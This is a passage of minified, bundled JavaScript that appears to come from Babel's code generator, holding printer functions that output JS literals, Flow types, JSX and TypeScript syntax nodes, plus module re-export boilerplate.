M4;AM=X;let{name:J}=X,Q=this.tokenMap.find(X,(Y)=>Y.value===J);if(Q)return M4=this._originalCode.slice(Q.start,Q.end),M4;return M4=X.name}function oO1(X){var J;this.sourceIdentifierName(((J=X.loc)==null?void 0:J.identifierName)||X.name),this.word(this.tokenMap?this._getRawIdentifier(X):X.name)}function tO1(){this.tokenChar(63)}function eO1(X){this.token("..."),this.print(X.argument)}function XF1(X){let J=X.properties;if(this.tokenChar(123),J.length){let Q=this.enterDelimited();this.space(),this.printList(J,this.shouldPrintTrailingComma("}"),!0,!0),this.space(),Q()}this.sourceWithOffset("end",X.loc,-1),this.tokenChar(125)}function JF1(X){this.printJoin(X.decorators),this._methodHead(X),this.space(),this.print(X.body)}function QF1(X){if(this.printJoin(X.decorators),X.computed)this.tokenChar(91),this.print(X.key),this.tokenChar(93);else{if(nO1(X.value)&&FW(X.key)&&X.key.name===X.value.left.name){this.print(X.value);return}if(this.print(X.key),X.shorthand&&FW(X.key)&&FW(X.value)&&X.key.name===X.value.name)return}this.tokenChar(58),this.space(),this.print(X.value)}function YF1(X){let J=X.elements,Q=J.length;this.tokenChar(91);let Y=this.enterDelimited();for(let W=0;W<J.length;W++){let G=J[W];if(G){if(W>0)this.space();if(this.print(G),W<Q-1||this.shouldPrintTrailingComma("]"))this.token(",",!1,W)}else this.token(",",!1,W)}Y(),this.tokenChar(93)}function WF1(X){let J=X.properties,Q,Y;if(this.format.recordAndTupleSyntaxType==="bar")Q="{|",Y="|}";else if(this.format.recordAndTupleSyntaxType!=="hash"&&this.format.recordAndTupleSyntaxType!=null)throw Error(`The "recordAndTupleSyntaxType" generator option must be "bar" or "hash" (${JSON.stringify(this.format.recordAndTupleSyntaxType)} received).`);else Q="#{",Y="}";if(this.token(Q),J.length)this.space(),this.printList(J,this.shouldPrintTrailingComma(Y),!0,!0),this.space();this.token(Y)}function GF1(X){let J=X.elements,Q=J.length,Y,W;if(this.format.recordAndTupleSyntaxType==="bar")Y="[|",W="|]";else if(this.format.recordAndTupleSyntaxType==="hash")Y="#[",W="]";else throw Error(`${this.format.recordAndTupleSyntaxType} is not a valid recordAndTuple syntax type`);this.token(Y);for(let G=0;G<J.length;G++){let H=J[G];if(H){if(G>0)this.space();if(this.print(H),G<Q-1||this.shouldPrintTrailingComma(W))this.token(",",!1,G)}}this.token(W)}function HF1(X){this.word(`/${X.pattern}/${X.flags}`)}function zF1(X){this.word(X.value?"true":"false")}function $F1(){this.word("null")}function VF1(X){let J=this.getPossibleRaw(X),Q=this.format.jsescOption,Y=X.value,W=Y+"";if(Q.numbers)this.number(wM(Y,Q),Y);else if(J==null)this.number(W,Y);else if(this.format.minified)this.number(J.length<W.length?J:W,Y);else this.number(J,Y)}function KF1(X){let J=this.getPossibleRaw(X);if(!this.format.minified&&J!==void 0){this.token(J);return}let Q=wM(X.value,this.format.jsescOption);this.token(Q)}function UF1(X){let J=this.getPossibleRaw(X);if(!this.format.minified&&J!==void 0){this.word(J);return}this.word(X.value+"n")}var DM=new Set(["^^","@@","^","%","#"]);function ZF1(){let{topicToken:X}=this.format;if(DM.has(X))this.token(X);else{let J=JSON.stringify(X),Q=Array.from(DM,(Y)=>JSON.stringify(Y));throw Error(`The "topicToken" generator option must be one of ${Q.join(", ")} (${J} received instead).`)}}function qF1(X){this.print(X.expression)}function BF1(X){this.print(X.callee)}function MF1(){this.tokenChar(35)}function jF1(){this.word("void")}});var IM=v((R4)=>{Object.defineProperty(R4,"__esModule",{value:!0});R4.AnyTypeAnnotation=cF1;R4.ArrayTypeAnnotation=lF1;R4.BooleanLiteralTypeAnnotation=dF1;R4.BooleanTypeAnnotation=pF1;R4.DeclareClass=rF1;R4.DeclareExportAllDeclaration=WR1;R4.DeclareExportDeclaration=YR1;R4.DeclareFunction=aF1;R4.DeclareInterface=oF1;R4.DeclareModule=tF1;R4.DeclareModuleExports=eF1;R4.DeclareOpaqueType=JR1;R4.DeclareTypeAlias=XR1;R4.DeclareVariable=QR1;R4.DeclaredPredicate=sF1;R4.EmptyTypeAnnotation=CR1;R4.EnumBooleanBody=HR1;R4.EnumBooleanMember=UR1;R4.EnumDeclaration=GR1;R4.EnumDefaultedMember=KR1;R4.EnumNumberBody=zR1;R4.EnumNumberMember=ZR1;R4.EnumStringBody=$R1;R4.EnumStringMember=qR1;R4.EnumSymbolBody=VR1;R4.ExistsTypeAnnotation=MR1;R4.FunctionTypeAnnotation=jR1;R4.FunctionTypeParam=OR1;R4.IndexedAccessType=oR1;R4.InferredPredicate=nF1;R4.InterfaceDeclaration=DR1;R4.GenericTypeAnnotation=R4.ClassImplements=R4.InterfaceExtends=FR1;R4.InterfaceTypeAnnotation=NR1;R4.IntersectionTypeAnnotation=LR1;R4.MixedTypeAnnotation=IR1;R4.NullLiteralTypeAnnotation=iF1;R4.NullableTypeAnnotation=PR1;Object.defineProperty(R4,"NumberLiteralTypeAnnotation",{enumerable:!0,get:function(){return LM.NumericLiteral}});R4.NumberTypeAnnotation=SR1;R4.ObjectTypeAnnotation=yR1;R4.ObjectTypeCallProperty=mR1;R4.ObjectTypeIndexer=uR1;R4.ObjectTypeInternalSlot=gR1;R4.ObjectTypeProperty=cR1;R4.ObjectTypeSpreadProperty=lR1;R4.OpaqueType=hR1;R4.OptionalIndexedAccessType=tR1;R4.QualifiedTypeIdentifier=pR1;Object.defineProperty(R4,"StringLiteralTypeAnnotation",{enumerable:!0,get:function(){return LM.StringLiteral}});R4.StringTypeAnnotation=TR1;R4.SymbolTypeAnnotation=dR1;R4.ThisTypeAnnotation=_R1;R4.TupleTypeAnnotation=ER1;R4.TypeAlias=bR1;R4.TypeAnnotation=vR1;R4.TypeCastExpression=aR1;R4.TypeParameter=xR1;R4.TypeParameterDeclaration=R4.TypeParameterInstantiation=fR1;R4.TypeofTypeAnnotation=kR1;R4.UnionTypeAnnotation=rR1;R4.Variance=nR1;R4.VoidTypeAnnotation=sR1;R4._interfaceish=RR1;R4._variance=AR1;var yF1=y1(),gF1=jW(),mF1=lX(),LM=RW(),{isDeclareExportDeclaration:j4,isStatement:uF1}=yF1;function cF1(){this.word("any")}function lF1(X){this.print(X.elementType,!0),this.tokenChar(91),this.tokenChar(93)}function pF1(){this.word("boolean")}function dF1(X){this.word(X.value?"true":"false")}function iF1(){this.word("null")}function rF1(X,J){if(!j4(J))this.word("declare"),this.space();this.word("class"),this.space(),this._interfaceish(X)}function aF1(X,J){if(!j4(J))this.word("declare"),this.space();if(this.word("function"),this.space(),this.print(X.id),this.print(X.id.typeAnnotation.typeAnnotation),X.predicate)this.space(),this.print(X.predicate);this.semicolon()}function nF1(){this.tokenChar(37),this.word("checks")}function sF1(X){this.tokenChar(37),this.word("checks"),this.tokenChar(40),this.print(X.value),this.tokenChar(41)}function oF1(X){this.word("declare"),this.space(),this.InterfaceDeclaration(X)}function tF1(X){this.word("declare"),this.space(),this.word("module"),this.space(),this.print(X.id),this.space(),this.print(X.body)}function eF1(X){this.word("declare"),this.space(),this.word("module"),this.tokenChar(46),this.word("exports"),this.print(X.typeAnnotation)}function XR1(X){this.word("declare"),this.space(),this.TypeAlias(X)}function JR1(X,J){if(!j4(J))this.word("declare"),this.space();this.OpaqueType(X)}function QR1(X,J){if(!j4(J))this.word("declare"),this.space();this.word("var"),this.space(),this.print(X.id),this.print(X.id.typeAnnotation),this.semicolon()}function YR1(X){if(this.word("declare"),this.space(),this.word("export"),this.space(),X.default)this.word("default"),this.space();BR1.call(this,X)}function WR1(X){this.word("declare"),this.space(),gF1.ExportAllDeclaration.call(this,X)}function GR1(X){let{id:J,body:Q}=X;this.word("enum"),this.space(),this.print(J),this.print(Q)}function O4(X,J,Q){if(Q)X.space(),X.word("of"),X.space(),X.word(J);X.space()}function F4(X,J){let{members:Q}=J;X.token("{"),X.indent(),X.newline();for(let Y of Q)X.print(Y),X.newline();if(J.hasUnknownMembers)X.token("..."),X.newline();X.dedent(),X.token("}")}function HR1(X){let{explicitType:J}=X;O4(this,"boolean",J),F4(this,X)}function zR1(X){let{explicitType:J}=X;O4(this,"number",J),F4(this,X)}function $R1(X){let{explicitType:J}=X;O4(this,"string",J),F4(this,X)}function VR1(X){O4(this,"symbol",!0),F4(this,X)}function KR1(X){let{id:J}=X;this.print(J),this.tokenChar(44)}function AW(X,J){X.print(J.id),X.space(),X.token("="),X.space(),X.print(J.init),X.token(",")}function UR1(X){AW(this,X)}function ZR1(X){AW(this,X)}function qR1(X){AW(this,X)}function BR1(X){if(X.declaration){let J=X.declaration;if(this.print(J),!uF1(J))this.semicolon()}else{if(this.tokenChar(123),X.specifiers.length)this.space(),this.printList(X.specifiers),this.space();if(this.tokenChar(125),X.source)this.space(),this.word("from"),this.space(),this.print(X.source);this.semicolon()}}function MR1(){this.tokenChar(42)}function jR1(X,J){if(this.print(X.typeParameters),this.tokenChar(40),X.this){if(this.word("this"),this.tokenChar(58),this.space(),this.print(X.this.typeAnnotation),X.params.length||X.rest)this.tokenChar(44),this.space()}if(this.printList(X.params),X.rest){if(X.params.length)this.tokenChar(44),this.space();this.token("..."),this.print(X.rest)}this.tokenChar(41);let Q=J==null?void 0:J.type;if(Q!=null&&(Q==="ObjectTypeCallProperty"||Q==="ObjectTypeInternalSlot"||Q==="DeclareFunction"||Q==="ObjectTypeProperty"&&J.method))this.tokenChar(58);else this.space(),this.token("=>");this.space(),this.print(X.returnType)}function OR1(X){if(this.print(X.name),X.optional)this.tokenChar(63);if(X.name)this.tokenChar(58),this.space();this.print(X.typeAnnotation)}function FR1(X){this.print(X.id),this.print(X.typeParameters,!0)}function RR1(X){var J;if(this.print(X.id),this.print(X.typeParameters),(J=X.extends)!=null&&J.length)this.space(),this.word("extends"),this.space(),this.printList(X.extends);if(X.type==="DeclareClass"){var Q,Y;if((Q=X.mixins)!=null&&Q.length)this.space(),this.word("mixins"),this.space(),this.printList(X.mixins);if((Y=X.implements)!=null&&Y.length)this.space(),this.word("implements"),this.space(),this.printList(X.implements)}this.space(),this.print(X.body)}function AR1(X){var J;let Q=(J=X.variance)==null?void 0:J.kind;if(Q!=null){if(Q==="plus")this.tokenChar(43);else if(Q==="minus")this.tokenChar(45)}}function DR1(X){this.word("interface"),this.space(),this._interfaceish(X)}function wR1(X){this.space(),this.token("&",!1,X),this.space()}function NR1(X){var J;if(this.word("interface"),(J=X.extends)!=null&&J.length)this.space(),this.word("extends"),this.space(),this.printList(X.extends);this.space(),this.print(X.body)}function LR1(X){this.printJoin(X.types,void 0,void 0,wR1)}function IR1(){this.word("mixed")}function CR1(){this.word("empty")}function PR1(X){this.tokenChar(63),this.print(X.typeAnnotation)}function SR1(){this.word("number")}function TR1(){this.word("string")}function _R1(){this.word("this")}function ER1(X){this.tokenChar(91),this.printList(X.types),this.tokenChar(93)}function kR1(X){this.word("typeof"),this.space(),this.print(X.argument)}function bR1(X){this.word("type"),this.space(),this.print(X.id),this.print(X.typeParameters),this.space(),this.tokenChar(61),this.space(),this.print(X.right),this.semicolon()}function vR1(X,J){if(this.tokenChar(58),this.space(),J.type==="ArrowFunctionExpression")this.tokenContext|=mF1.TokenContext.arrowFlowReturnType;else if(X.optional)this.tokenChar(63);this.print(X.typeAnnotation)}function fR1(X){this.tokenChar(60),this.printList(X.params),this.tokenChar(62)}function xR1(X){if(this._variance(X),this.word(X.name),X.bound)this.print(X.bound);if(X.default)this.space(),this.tokenChar(61),this.space(),this.print(X.default)}function hR1(X){if(this.word("opaque"),this.space(),this.word("type"),this.space(),this.print(X.id),this.print(X.typeParameters),X.supertype)this.tokenChar(58),this.space(),this.print(X.supertype);if(X.impltype)this.space(),this.tokenChar(61),this.space(),this.print(X.impltype);this.semicolon()}function yR1(X){if(X.exact)this.token("{|");else this.tokenChar(123);let J=[...X.properties,...X.callProperties||[],...X.indexers||[],...X.internalSlots||[]];if(J.length)this.newline(),this.space(),this.printJoin(J,!0,!0,void 0,void 0,function(Y){if(Y&&!J[0])return 1},()=>{if(J.length!==1||X.inexact)this.tokenChar(44),this.space()}),this.space();if(X.inexact){if(this.indent(),this.token("..."),J.length)this.newline();this.dedent()}if(X.exact)this.token("|}");else this.tokenChar(125)}function gR1(X){if(X.static)this.word("static"),this.space();if(this.tokenChar(91),this.tokenChar(91),this.print(X.id),this.tokenChar(93),this.tokenChar(93),X.optional)this.tokenChar(63);if(!X.method)this.tokenChar(58),this.space();this.print(X.value)}function mR1(X){if(X.static)this.word("static"),this.space();this.print(X.value)}function uR1(X){if(X.static)this.word("static"),this.space();if(this._variance(X),this.tokenChar(91),X.id)this.print(X.id),this.tokenChar(58),this.space();this.print(X.key),this.tokenChar(93),this.tokenChar(58),this.space(),this.print(X.value)}function cR1(X){if(X.proto)this.word("proto"),this.space();if(X.static)this.word("static"),this.space();if(X.kind==="get"||X.kind==="set")this.word(X.kind),this.space();if(this._variance(X),this.print(X.key),X.optional)this.tokenChar(63);if(!X.method)this.tokenChar(58),this.space();this.print(X.value)}function lR1(X){this.token("..."),this.print(X.argument)}function pR1(X){this.print(X.qualification),this.tokenChar(46),this.print(X.id)}function dR1(){this.word("symbol")}function iR1(X){this.space(),this.token("|",!1,X),this.space()}function rR1(X){this.printJoin(X.types,void 0,void 0,iR1)}function aR1(X){this.tokenChar(40),this.print(X.expression),this.print(X.typeAnnotation),this.tokenChar(41)}function nR1(X){if(X.kind==="plus")this.tokenChar(43);else this.tokenChar(45)}function sR1(){this.word("void")}function oR1(X){this.print(X.objectType,!0),this.tokenChar(91),this.print(X.indexType),this.tokenChar(93)}function tR1(X){if(this.print(X.objectType),X.optional)this.token("?.");this.tokenChar(91),this.print(X.indexType),this.tokenChar(93)}});var PM=v((CM)=>{Object.defineProperty(CM,"__esModule",{value:!0});CM.BlockStatement=VD1;CM.Directive=KD1;CM.DirectiveLiteral=qD1;CM.File=zD1;CM.InterpreterDirective=BD1;CM.Placeholder=MD1;CM.Program=$D1;function zD1(X){if(X.program)this.print(X.program.interpreter);this.print(X.program)}function $D1(X){var J;this.noIndentInnerCommentsHere(),this.printInnerComments();let Q=(J=X.directives)==null?void 0:J.length;if(Q){var Y;let W=X.body.length?2:1;if(this.printSequence(X.directives,void 0,W),!((Y=X.directives[Q-1].trailingComments)!=null&&Y.length))this.newline(W)}this.printSequence(X.body)}function VD1(X){var J;this.tokenChar(123);let Q=this.enterDelimited(),Y=(J=X.directives)==null?void 0:J.length;if(Y){var W;let G=X.body.length?2:1;if(this.printSequence(X.directives,!0,G),!((W=X.directives[Y-1].trailingComments)!=null&&W.length))this.newline(G)}this.printSequence(X.body,!0),Q(),this.rightBrace(X)}function KD1(X){this.print(X.value),this.semicolon()}var UD1=/(?:^|[^\\])(?:\\\\)*'/,ZD1=/(?:^|[^\\])(?:\\\\)*"/;function qD1(X){let J=this.getPossibleRaw(X);if(!this.format.minified&&J!==void 0){this.token(J);return}let{value:Q}=X;if(!ZD1.test(Q))this.token(`"${Q}"`);else if(!UD1.test(Q))this.token(`'${Q}'`);else throw Error("Malformed AST: it is not possible to print a directive containing both unescaped single and double quotes.")}function BD1(X){this.token(`#!${X.value}`),this.newline(1,!0)}function MD1(X){if(this.token("%%"),this.print(X.name),this.token("%%"),X.expectedNode==="Statement")this.semicolon()}});var TM=v((SM)=>{Object.defineProperty(SM,"__esModule",{value:!0});SM.JSXAttribute=ND1;SM.JSXClosingElement=vD1;SM.JSXClosingFragment=yD1;SM.JSXElement=ED1;SM.JSXEmptyExpression=fD1;SM.JSXExpressionContainer=SD1;SM.JSXFragment=xD1;SM.JSXIdentifier=LD1;SM.JSXMemberExpression=CD1;SM.JSXNamespacedName=ID1;SM.JSXOpeningElement=bD1;SM.JSXOpeningFragment=hD1;SM.JSXSpreadAttribute=PD1;SM.JSXSpreadChild=TD1;SM.JSXText=_D1;function ND1(X){if(this.print(X.name),X.value)this.tokenChar(61),this.print(X.value)}function LD1(X){this.word(X.name)}function ID1(X){this.print(X.namespace),this.tokenChar(58),this.print(X.name)}function CD1(X){this.print(X.object),this.tokenChar(46),this.print(X.property)}function PD1(X){this.tokenChar(123),this.token("..."),this.print(X.argument),this.rightBrace(X)}function SD1(X){this.tokenChar(123),this.print(X.expression),this.rightBrace(X)}function TD1(X){this.tokenChar(123),this.token("..."),this.print(X.expression),this.rightBrace(X)}function _D1(X){let J=this.getPossibleRaw(X);if(J!==void 0)this.token(J,!0);else this.token(X.value,!0)}function ED1(X){let J=X.openingElement;if(this.print(J),J.selfClosing)return;this.indent();for(let Q of X.children)this.print(Q);this.dedent(),this.print(X.closingElement)}function kD1(){this.space()}function bD1(X){this.tokenChar(60),this.print(X.name);{if(X.typeArguments)this.print(X.typeArguments);this.print(X.typeParameters)}if(X.attributes.length>0)this.space(),this.printJoin(X.attributes,void 0,void 0,kD1);if(X.selfClosing)this.space(),this.tokenChar(47);this.tokenChar(62)}function vD1(X){this.tokenChar(60),this.tokenChar(47),this.print(X.name),this.tokenChar(62)}function fD1(){this.printInnerComments()}function xD1(X){this.print(X.openingFragment),this.indent();for(let J of X.children)this.print(J);this.dedent(),this.print(X.closingFragment)}function hD1(){this.tokenChar(60),this.tokenChar(62)}function yD1(){this.token("</"),this.tokenChar(62)}});var fM=v((vM)=>{Object.defineProperty(vM,"__esModule",{value:!0});vM.TSAnyKeyword=qw1;vM.TSArrayType=vw1;vM.TSSatisfiesExpression=vM.TSAsExpression=ew1;vM.TSBigIntKeyword=Bw1;vM.TSBooleanKeyword=Fw1;vM.TSCallSignatureDeclaration=zw1;vM.TSInterfaceHeritage=vM.TSClassImplements=nw1;vM.TSConditionalType=uw1;vM.TSConstructSignatureDeclaration=$w1;vM.TSConstructorType=Sw1;vM.TSDeclareFunction=Ww1;vM.TSDeclareMethod=Gw1;vM.TSEnumBody=bM;vM.TSEnumDeclaration=QN1;vM.TSEnumMember=YN1;vM.TSExportAssignment=KN1;vM.TSExternalModuleReference=$N1;vM.TSFunctionType=Pw1;vM.TSImportEqualsDeclaration=zN1;vM.TSImportType=HN1;vM.TSIndexSignature=Zw1;vM.TSIndexedAccessType=dw1;vM.TSInferType=cw1;vM.TSInstantiationExpression=JN1;vM.TSInterfaceBody=ow1;vM.TSInterfaceDeclaration=sw1;vM.TSIntersectionType=mw1;vM.TSIntrinsicKeyword=Iw1;vM.TSLiteralType=aw1;vM.TSMappedType=iw1;vM.TSMethodSignature=Uw1;vM.TSModuleBlock=GN1;vM.TSModuleDeclaration=WN1;vM.TSNamedTupleMember=yw1;vM.TSNamespaceExportDeclaration=UN1;vM.TSNeverKeyword=Lw1;vM.TSNonNullExpression=VN1;vM.TSNullKeyword=Nw1;vM.TSNumberKeyword=jw1;vM.TSObjectKeyword=Ow1;vM.TSOptionalType=xw1;vM.TSParameterProperty=Yw1;vM.TSParenthesizedType=lw1;vM.TSPropertySignature=Vw1;vM.TSQualifiedName=Hw1;vM.TSRestType=hw1;vM.TSStringKeyword=Rw1;vM.TSSymbolKeyword=Aw1;vM.TSTemplateLiteralType=rw1;vM.TSThisType=Cw1;vM.TSTupleType=fw1;vM.TSTypeAliasDeclaration=tw1;vM.TSTypeAnnotation=Xw1;vM.TSTypeAssertion=XN1;vM.TSTypeLiteral=bw1;vM.TSTypeOperator=pw1;vM.TSTypeParameter=Qw1;vM.TSTypeParameterDeclaration=vM.TSTypeParameterInstantiation=Jw1;vM.TSTypePredicate=Ew1;vM.TSTypeQuery=kw1;vM.TSTypeReference=_w1;vM.TSUndefinedKeyword=ww1;vM.TSUnionType=gw1;vM.TSUnknownKeyword=Mw1;vM.TSVoidKeyword=Dw1;vM.tsPrintClassMemberModifiers=qN1;vM.tsPrintFunctionOrConstructorType=Tw1;vM.tsPrintPropertyOrMethodName=Kw1;vM.tsPrintSignatureDeclarationBase=ZN1;function Xw1(X,J){if(this.token((J.type==="TSFunctionType"||J.type==="TSConstructorType")&&J.typeAnnotation===X?"=>":":"),this.space(),X.optional)this.tokenChar(63);this.print(X.typeAnnotation)}function Jw1(X,J){this.tokenChar(60);let Q=J.type==="ArrowFunctionExpression"&&X.params.length===1;if(this.tokenMap&&X.start!=null&&X.end!=null)Q&&(Q=!!this.tokenMap.find(X,(Y)=>this.tokenMap.matchesOriginal(Y,","))),Q||(Q=this.shouldPrintTrailingComma(">"));this.printList(X.params,Q),this.tokenChar(62)}function Qw1(X){if(X.const)this.word("const"),this.space();if(X.in)this.word("in"),this.space();if(X.out)this.word("out"),this.space();if(this.word(X.name),X.constraint)this.space(),this.word("extends"),this.space(),this.print(X.constraint);if(X.default)this.space(),this.tokenChar(61),this.space(),this.print(X.default)}function Yw1(X){if(X.accessibility)this.word(X.accessibility),this.space();if(X.readonly)this.word("readonly"),this.space();this._param(X.parameter)}function Ww1(X,J){if(X.declare)this.word("declare"),this.space();this._functionHead(X,J),this.semicolon()}function Gw1(X){this._classMethodHead(X),this.semicolon()}function Hw1(X){this.print(X.left),this.tokenChar(46),this.print(X.right)}function zw1(X){this.tsPrintSignatureDeclarationBase(X),O7(this,X)}function O7(X,J){if(!X.tokenMap||!J.start||!J.end){X.semicolon();return}if(X.tokenMap.endMatches(J,","))X.token(",");else if(X.tokenMap.endMatches(J,";"))X.semicolon()}function $w1(X){this.word("new"),this.space(),this.tsPrintSignatureDeclarationBase(X),O7(this,X)}function Vw1(X){let{readonly:J}=X;if(J)this.word("readonly"),this.space();this.tsPrintPropertyOrMethodName(X),this.print(X.typeAnnotation),O7(this,X)}function Kw1(X){if(X.computed)this.tokenChar(91);if(this.print(X.key),X.computed)this.tokenChar(93);if(X.optional)this.tokenChar(63)}function Uw1(X){let{kind:J}=X;if(J==="set"||J==="get")this.word(J),this.space();this.tsPrintPropertyOrMethodName(X),this.tsPrintSignatureDeclarationBase(X),O7(this,X)}function Zw1(X){let{readonly:J,static:Q}=X;if(Q)this.word("static"),this.space();if(J)this.word("readonly"),this.space();this.tokenChar(91),this._parameters(X.parameters,"]"),this.print(X.typeAnnotation),O7(this,X)}function qw1(){this.word("any")}function Bw1(){this.word("bigint")}function Mw1(){this.word("unknown")}function jw1(){this.word("number")}function Ow1(){this.word("object")}function Fw1(){this.word("boolean")}function Rw1(){this.word("string")}function Aw1(){this.word("symbol")}function Dw1(){this.word("void")}function ww1(){this.word("undefined")}function Nw1(){this.word("null")}function Lw1(){this.word("never")}function Iw1(){this.word("intrinsic")}function Cw1(){this.word("this")}function Pw1(X){this.tsPrintFunctionOrConstructorType(X)}function Sw1(X){if(X.abstract)this.word("abstract"),this.space();this.word("new"),this.space(),this.tsPrintFunctionOrConstructorType(X)}function Tw1(X){let{typeParameters:J}=X,Q=X.parameters;this.print(J),this.tokenChar(40),this._parameters(Q,")"),this.space();let Y=X.typeAnnotation;this.print(Y)}function _w1(X){let J=X.typeParameters;this.print(X.typeName,!!J),this.print(J)}function Ew1(X){if(X.asserts)this.word("asserts"),this.space();if(this.print(X.parameterName),X.typeAnnotation)this.space(),this.word("is"),this.space(),this.print(X.typeAnnotation.typeAnnotation)}function kw1(X){this.word("typeof"),this.space(),this.print(X.exprName);let J=X.typeParameters;if(J)this.print(J)}function bw1(X){A4(this,X,()=>this.printJoin(X.members,!0,!0))}function vw1(X){this.print(X.elementType,!0),this.tokenChar(91),this.tokenChar(93)}function fw1(X){this.tokenChar(91),this.printList(X.elementTypes,this.shouldPrintTrailingComma("]")),this.tokenChar(93)}function xw1(X){this.print(X.typeAnnotation),this.tokenChar(63)}function hw1(X){this.token("..."),this.print(X.typeAnnotation)}function yw1(X){if(this.print(X.label),X.optional)this.tokenChar(63);this.tokenChar(58),this.space(),this.print(X.elementType)}function gw1(X){kM(this,X,"|")}function mw1(X){kM(this,X,"&")}function kM(X,J,Q){var Y;let W=0;if((Y=X.tokenMap)!=null&&Y.startMatches(J,Q))W=1,X.token(Q);X.printJoin(J.types,void 0,void 0,function(G){this.space(),this.token(Q,null,G+W),this.space()})}function uw1(X){this.print(X.checkType),this.space(),this.word("extends"),this.space(),this.print(X.extendsType),this.space(),this.tokenChar(63),this.space(),this.print(X.trueType),this.space(),this.tokenChar(58),this.space(),this.print(X.falseType)}function cw1(X){this.word("infer"),this.print(X.typeParameter)}function lw1(X){this.tokenChar(40),this.print(X.typeAnnotation),this.tokenChar(41)}function pw1(X){this.word(X.operator),this.space(),this.print(X.typeAnnotation)}function dw1(X){this.print(X.objectType,!0),this.tokenChar(91),this.print(X.indexType),this.tokenChar(93)}function iw1(X){let{nameType:J,optional:Q,readonly:Y,typeAnnotation:W}=X;this.tokenChar(123);let G=this.enterDelimited();if(this.space(),Y)_M(this,Y),this.word("readonly"),this.space();if(this.tokenChar(91),this.word(X.typeParameter.name),this.space(),this.word("in"),this.space(),this.print(X.typeParameter.constraint),J)this.space(),this.word("as"),this.space(),this.print(J);if(this.tokenChar(93),Q)_M(this,Q),this.tokenChar(63);if(W)this.tokenChar(58),this.space(),this.print(W);this.space(),G(),this.tokenChar(125)}function _M(X,J){if(J!==!0)X.token(J)}function rw1(X){this._printTemplate(X,X.types)}function aw1(X){this.print(X.literal)}function nw1(X){this.print(X.expression),this.print(X.typeArguments)}function sw1(X){let{declare:J,id:Q,typeParameters:Y,extends:W,body:G}=X;if(J)this.word("declare"),this.space();if(this.word("interface"),this.space(),this.print(Q),this.print(Y),W!=null&&W.length)this.space(),this.word("extends"),this.space(),this.printList(W);this.space(),this.print(G)}function ow1(X){A4(this,X,()=>this.printJoin(X.body,!0,!0))}function tw1(X){let{declare:J,id:Q,typeParameters:Y,typeAnnotation:W}=X;if(J)this.word("declare"),this.space();this.word("type"),this.space(),this.print(Q),this.print(Y),this.space(),this.tokenChar(61),this.space(),this.print(W),this.semicolon()}function ew1(X){let{type:J,expression:Q,typeAnnotation:Y}=X;this.print(Q,!0),this.space(),this.word(J==="TSAsExpression"?"as":"satisfies"),this.space(),this.print(Y)}function XN1(X){let{typeAnnotation:J,expression:Q}=X;this.tokenChar(60),this.print(J),this.tokenChar(62),this.space(),this.print(Q)}function JN1(X){this.print(X.expression),this.print(X.typeParameters)}function QN1(X){let{declare:J,const:Q,id:Y}=X;if(J)this.word("declare"),this.space();if(Q)this.word("const"),this.space();this.word("enum"),this.space(),this.print(Y),this.space(),bM.call(this,X)}function bM(X){A4(this,X,()=>{var J;return this.printList(X.members,(J=this.shouldPrintTrailingComma("}"))!=null?J:!0,!0,!0)})}function YN1(X){let{id:J,initializer:Q}=X;if(this.print(J),Q)this.space(),this.tokenChar(61),this.space(),this.print(Q)}function WN1(X){let{declare:J,id:Q,kind:Y}=X;if(J)this.word("declare"),this.space();{if(!X.global)this.word(Y!=null?Y:Q.type==="Identifier"?"namespace":"module"),this.space();if(this.print(Q),!X.body){this.semicolon();return}let W=X.body;while(W.type==="TSModuleDeclaration")this.tokenChar(46),this.print(W.id),W=W.body;this.space(),this.print(W)}}function GN1(X){A4(this,X,()=>this.printSequence(X.body,!0))}function HN1(X){let{argument:J,qualifier:Q,options:Y}=X;if(this.word("import"),this.tokenChar(40),this.print(J),Y)this.tokenChar(44),this.print(Y);if(this.tokenChar(41),Q)this.tokenChar(46),this.print(Q);let W=X.typeParameters;if(W)this.print(W)}function zN1(X){let{id:J,moduleReference:Q}=X;if(X.isExport)this.word("export"),this.space();this.word("import"),this.space(),this.print(J),this.space(),this.tokenChar(61),this.space(),this.print(Q),this.semicolon()}function $N1(X){this.token("require("),this.print(X.expression),this.tokenChar(41)}function VN1(X){this.print(X.expression),this.tokenChar(33)}function KN1(X){this.word("export"),this.space(),this.tokenChar(61),this.space(),this.print(X.expression),this.semicolon()}function UN1(X){this.word("export"),this.space(),this.word("as"),this.space(),this.word("namespace"),this.space(),this.print(X.id),this.semicolon()}function ZN1(X){let{typeParameters:J}=X,Q=X.parameters;this.print(J),this.tokenChar(40),this._parameters(Q,")");let Y=X.typeAnnotation;this.print(Y)}function qN1(X){let J=X.type==="ClassPrivateProperty",Q=X.type==="ClassAccessorProperty"||X.type==="ClassProperty";if(EM(this,X,[Q&&X.declare&&"declare",!J&&X.accessibility]),X.static)this.word("static"),this.space();EM(this,X,[!J&&X.abstract&&"abstract",!J&&X.override&&"override",(Q||J)&&X.readonly&&"readonly"])}function A4(X,J,Q){X.token("{");let Y=X.enterDelimited();Q(),Y(),X.rightBrace(J)}function EM(X,J,Q){var Y;let W=new Set;for(let G of Q)if(G)W.add(G);(Y=X.tokenMap)==null||Y.find(J,(G)=>{if(W.has(G.value))return X.token(G.value),X.space(),W.delete(G.value),W.size===0});for(let G of W)X.word(G),X.space()}});var xM=v((s1)=>{Object.defineProperty(s1,"__esModule",{value:!0});var DW=tB();Object.keys(DW).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in s1&&s1[X]===DW[X])return;Object.defineProperty(s1,X,{enumerable:!0,get:function(){return DW[X]}})});var wW=JM();Object.keys(wW).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in s1&&s1[X]===wW[X])return;Object.defineProperty(s1,X,{enumerable:!0,get:function(){return wW[X]}})});var NW=zM();Object.keys(NW).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in s1&&s1[X]===NW[X])return;Object.defineProperty(s1,X,{enumerable:!0,get:function(){return NW[X]}})});var LW=VM();Object.keys(LW).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in s1&&s1[X]===LW[X])return;Object.defineProperty(s1,X,{enumerable:!0,get:function(){return LW[X]}})});var IW=UM();Object.keys(IW).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in s1&&s1[X]===IW[X])return;Object.defineProperty(s1,X,{enumerable:!0,get:function(){return IW[X]}})});var CW=jW();Object.keys(CW).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in s1&&s1[X]===CW[X])return;Object.defineProperty(s1,X,{enumerable:!0,get:function(){return CW[X]}})});var 